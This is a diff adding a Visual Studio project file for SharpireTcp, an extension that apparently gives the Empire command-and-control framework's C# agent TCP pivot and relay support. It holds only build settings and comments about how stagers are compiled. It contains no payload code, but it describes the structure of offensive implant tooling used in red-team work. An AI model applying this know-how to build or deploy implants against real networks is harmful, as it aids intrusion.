@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  SharpireTcp is an optional source-library extension to Sharpire that adds
+  tcp pivot support (V2 frame codec, tcp child transport, relay routing and
+  the TcpPivotServer parent). When Empire generates a tcp stager it lists
+  BOTH Sharpire and SharpireTcp as ReferenceSourceLibraries so
+  EmpireCompiler globs both directories' .cs files into one compilation
+  unit. It lives in its own directory (like SharpireMalleable) because a
+  partial class EmpireStager inside the base Sharpire directory makes
+  EmpireCompiler drop Empire.Agent.Cert.cs.
+
+  The plain http listener only lists Sharpire, so base binaries ship
+  without the tcp pivot types.
+
+  This csproj is provided for IDE convenience only; EmpireCompiler does
+  not consume .csproj <Compile> entries; it recursively globs *.cs from
+  the ReferenceSourceLibrary's Location directory.
+-->
+<Project ToolsVersion="14.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <ProjectGuid>{7C3D9E52-4A16-4B8F-A0D7-5E21C8B94F36}</ProjectGuid>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <TargetFrameworkProfile />
+    <LangVersion>7</LangVersion>
+    <OutputType>Library</OutputType>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Numerics" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Empire.Agent.Pivot.Frame.cs" />
+    <Compile Include="Empire.Agent.Pivot.Child.cs" />
+    <Compile Include="Empire.Agent.Pivot.Relay.cs" />
+    <Compile Include="Empire.Agent.Pivot.Parent.cs" />
+    <!-- Base-library .cs files are listed via Link so the IDE sees them
+         alongside the extension. EmpireCompiler ignores this list. -->
+    <Compile Include="..\Sharpire\Empire.Agent.cs">
+      <Link>Base\Empire.Agent.cs</Link>
+    </Compile>
+    <Compile Include="..\Sharpire\Empire.Agent.Coms.cs">
+      <Link>Base\Empire.Agent.Coms.cs</Link>
+    </Compile>
+    <Compile Include="..\Sharpire\Empire.Agent.Stager.cs">
+      <Link>Base\Empire.Agent.Stager.cs</Link>
+    </Compile>
+    <Compile Include="..\Sharpire\Empire.Agent.Cert.cs">
+      <Link>Base\Empire.Agent.Cert.cs</Link>
+    </Compile>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
